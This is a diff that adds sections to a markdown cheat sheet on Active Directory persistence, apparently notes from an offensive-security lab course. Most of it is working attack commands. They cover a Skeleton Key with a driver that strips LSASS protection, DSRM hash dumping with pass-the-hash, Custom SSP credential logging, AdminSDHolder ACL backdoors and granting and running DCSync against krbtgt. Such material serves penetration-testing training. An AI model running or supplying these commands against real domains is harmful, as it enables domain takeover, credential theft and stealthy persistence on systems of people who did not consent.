@@ -54,3 +54,135 @@ Access any computer as any user on the domain using password **mimikatz**
 ```powershell
 Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator
 ```
+In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
+```mimikatz
+mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # misc::skeleton
+mimikatz # !-
+```
+Note that above would be very noisy in logs - Service installation (Kernel mode driver
+
+## DSRM
+Dump DSRM password (needs DA privs)
+```powershell
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
+```
+output form command above - Hash NTLM is DSRM password
+```
+RID  : 000001f4 (500)
+User : Administrator
+Hash NTLM: a102ad5753f4c441e3af31c97fad86fd
+RID  : 000001f5 (501)
+User : Guest
+```
+we can pass this hash to authenticate, but we need to change the configuration first
+```powershell
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+```
+Then you can (over) pass the hash using mimikatz
+> note that the "domain" used is just the name of the DC machine unlike other PTH
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd  /run:powershell.exe"'
+```
+After PTH you coul access to share or remote code exection like WMI
+
+## Custom SSP
+there are 2 ways to exploit this
+1. Drop the mimilib.dll to system32 and add mimilib to **HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security** Packages:
+```powershell
+$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
+$packages += "mimilib"
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name'Security Packages' -Value $packages
+```
+2. Using mimikatz, inject into lsass (Not stable with Server 2016):
+```powershell
+Invoke-Mimikatz -Command '"misc::memssp"'
+```
+Then, All local logons on the DC are logged to 
+**C:\Windows\system32\kiwissp.log**
+
+## ACL
+### AdminSDHolder
+> AdminSDHolder - Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL. 
+
+#### 1. Add ACL
+Add FullControl permissions for a user to the AdminSDHolder:
+```powershell
+# PowerView
+Add-ObjectAcl -TargetADSprefix'CN=AdminSDHolder,CN=System' -PrincipalSamAccountNamestudent1 -Rights All -Verbose
+
+# AD Module
+Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose
+```
+Other interesting permissions (ResetPassword, WriteMembers) for a user
+```powershell
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights ResetPassword -Verbose
+
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights WriteMembers -Verbose
+```
+
+#### 2. Run SDProp
+Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory
+```powershell
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+```
+For pre-Server 2008 machines:
+
+```powershell
+Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
+```
+
+#### 3. Checking
+
+```powershell
+# PowerView
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student1'}
+
+#ActiveDirectory Module
+(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
+```
+
+#### 4. Abuse Full Control
+Add member
+```powershell
+# powerveiw_dev
+Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
+
+#ActiveDirectory Module
+Add-ADGroupMember -Identity 'Domain Admins' -Members testda
+```
+reset password
+```powershell
+# powerveiw_dev
+Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+
+#ActiveDirectory Module
+Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+```
+
+### Right Abuse
+> same as AdminSDHolder but I'am add item directly to the domain.
+Add FullControl rights
+```powershell
+#Using PowerView:
+Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights All -Verbose 
+
+#Using ActiveDirectory Module and Set-ADACL:
+Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose
+```
+Add rights for DCSync
+```powershell
+#Using PowerView:
+Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights DCSync -Verbose
+
+#Using ActiveDirectory Module and Set-ADACL:
+Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -GUIDRight DCSync -Verbose
+```
+Execute DCSync:
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
